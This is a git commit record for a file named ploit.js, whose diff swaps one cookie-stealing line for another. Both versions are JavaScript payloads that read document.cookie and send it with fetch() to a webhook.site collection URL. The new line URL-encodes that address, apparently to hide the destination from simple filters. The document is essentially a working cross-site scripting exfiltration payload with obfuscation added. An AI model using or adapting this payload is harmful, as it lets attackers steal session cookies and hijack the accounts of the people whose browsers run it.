1d764015ed566637a8c6296655a0673ad75f242b
liljorry <q8_meshtag@proton.me>
2025-08-28 04:23:13 +0300

    Update ploit.js

--- ploit.js
+++ ploit.js
@@ -1,1 +1,2 @@
-fetch('https://webhook.site/bd10e25e-f1b3-4e2f-89b9-7362b1151c96?cookie=' + encodeURIComponent(document.cookie));
+// URL-encoded version of: https://webhook.site/bd10e25e-f1b3-4e2f-89b9-7362b1151c96
+fetch(decodeURIComponent('https%3A%2F%2Fwebhook.site%2Fbd10e25e-f1b3-4e2f-89b9-7362b1151c96') + '?cookie=' + encodeURIComponent(document.cookie))
